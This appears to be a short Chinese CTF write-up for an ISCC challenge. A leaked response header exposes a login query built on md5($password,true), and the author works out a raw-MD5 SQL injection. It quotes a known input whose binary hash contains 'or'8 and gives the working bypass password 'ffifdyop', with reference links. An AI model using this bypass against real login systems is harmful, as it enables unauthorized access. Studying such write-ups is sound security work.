#How？
##250
##http://script.iscc.org.cn/script02/login.php

>这应该不是出题者的初衷.随意填一个密码后,提示Your password for guest is wrong.<br>
然后,response head如下:

    Connection keep-alive
    Content-Length 34
    Content-Type text/html; charset=UTF-8
    Date Tue, 05 May 2015 15:47:31 GMT
    Server Apache
    Via 1.1 www.isclab.org (squid)
    X-Cache MISS from www.isclab.org
    X-Powered-By PHP/5.3.3
    goder Y618
    sql "select * from admin_password where password='".md5($password,true)."'"

然后,知道是md5 injection with raw md5 hashs.<br>
搜到下面的内容,大家看吧.<br>
不过似乎服务端是硬编码的,必须的猜出出题人给的那字符才行~~~<br>

>content: 129581926211651571912466741651878684928<br>
count: 18933549<br>
hex: 06da5430449f8f6f23dfc1276f722738<br>
raw: ?T0D??o#??'or'8.N=?<br>


[http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes](http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes)<br>
[http://auntitled.blogspot.jp/2010/09/leet-more-ctf-2010-write-up-oh-dears.html](http://auntitled.blogspot.jp/2010/09/leet-more-ctf-2010-write-up-oh-dears.html)<br>
[http://pastebin.com/w5E54PNz](http://pastebin.com/w5E54PNz)<br>
[http://pastebin.com/2xMG9rKi](http://pastebin.com/2xMG9rKi)<br>
[http://pastebin.com/ThxBESPs](http://pastebin.com/ThxBESPs)<br>


结果    居然是:<br>
ffifdyop